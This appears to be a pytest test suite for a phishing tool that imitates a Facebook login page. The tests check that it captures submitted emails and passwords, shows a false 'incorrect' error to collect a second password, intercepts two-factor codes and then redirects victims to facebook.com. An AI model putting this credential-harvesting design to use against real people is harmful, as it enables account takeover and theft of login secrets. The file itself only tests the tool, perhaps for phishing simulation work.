from __future__ import annotations

from pathlib import Path

import pytest
from httpx import ASGITransport, AsyncClient

from crystal_eye.config import CrystalEyeConfig
from crystal_eye.db.models import Credential
from crystal_eye.server.app import create_app
from crystal_eye.templates.registry import TemplateManifest, TemplateRegistry


@pytest.fixture
def captured_creds():
    return []


@pytest.fixture
def facebook_app(template_registry, captured_creds):
    manifest = template_registry.get("facebook")
    template_dir = template_registry.get_template_dir("facebook")
    config = CrystalEyeConfig(template="facebook", campaign="test")
    config._active_campaign_id = 1

    def on_credential(cred: Credential):
        captured_creds.append(cred)

    return create_app(
        config=config,
        template_manifest=manifest,
        template_dir=template_dir,
        on_credential=on_credential,
    )


@pytest.mark.asyncio
async def test_login_page_serves(facebook_app):
    transport = ASGITransport(app=facebook_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.get("/")
    assert response.status_code == 200
    assert "facebook" in response.text.lower()


@pytest.mark.asyncio
async def test_credential_capture(facebook_app, captured_creds):
    transport = ASGITransport(app=facebook_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post(
            "/login",
            data={"email": "victim@example.com", "pass": "password123"},
            follow_redirects=False,
        )

    # First attempt: should show error page (not redirect yet)
    assert response.status_code == 200
    assert "incorrect" in response.text.lower()
    assert len(captured_creds) == 1
    assert captured_creds[0].fields["email"] == "victim@example.com"
    assert captured_creds[0].fields["pass"] == "password123"


@pytest.mark.asyncio
async def test_redirect_after_max_attempts(facebook_app, captured_creds):
    transport = ASGITransport(app=facebook_app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # First attempt - error page
        await client.post(
            "/login",
            data={"email": "a@b.com", "pass": "pw1"},
            follow_redirects=False,
        )
        # Second attempt - should redirect (max_attempts=2)
        response = await client.post(
            "/login",
            data={"email": "a@b.com", "pass": "pw2"},
            follow_redirects=False,
        )

    assert response.status_code == 303
    assert "facebook.com" in response.headers.get("location", "")
    assert len(captured_creds) == 2


@pytest.fixture
def facebook_app_2fa(template_registry, captured_creds):
    manifest = template_registry.get("facebook")
    template_dir = template_registry.get_template_dir("facebook")
    config = CrystalEyeConfig(template="facebook", campaign="test", enable_2fa=True)
    config._active_campaign_id = 1

    def on_credential(cred: Credential):
        captured_creds.append(cred)

    return create_app(
        config=config,
        template_manifest=manifest,
        template_dir=template_dir,
        on_credential=on_credential,
    )


@pytest.mark.asyncio
async def test_2fa_flow(facebook_app_2fa, captured_creds):
    transport = ASGITransport(app=facebook_app_2fa)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # First login attempt - error page
        await client.post(
            "/login",
            data={"email": "victim@test.com", "pass": "pw1"},
            follow_redirects=False,
        )
        # Second attempt (max_attempts=2) - should show 2FA page
        response = await client.post(
            "/login",
            data={"email": "victim@test.com", "pass": "pw2"},
            follow_redirects=False,
        )

    assert response.status_code == 200
    assert "security code" in response.text.lower() or "two-factor" in response.text.lower()
    assert len(captured_creds) == 2


@pytest.mark.asyncio
async def test_2fa_code_capture(facebook_app_2fa, captured_creds):
    transport = ASGITransport(app=facebook_app_2fa)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Go through login attempts to reach 2FA
        await client.post("/login", data={"email": "a@b.com", "pass": "pw1"}, follow_redirects=False)
        await client.post("/login", data={"email": "a@b.com", "pass": "pw2"}, follow_redirects=False)

        # Submit 2FA code
        response = await client.post(
            "/2fa",
            data={"code": "483921"},
            follow_redirects=False,
        )

    assert response.status_code == 303
    assert "facebook.com" in response.headers.get("location", "")
    # 2 cred captures + 1 2FA code capture
    assert len(captured_creds) == 3
    assert captured_creds[2].fields["2fa_code"] == "483921"
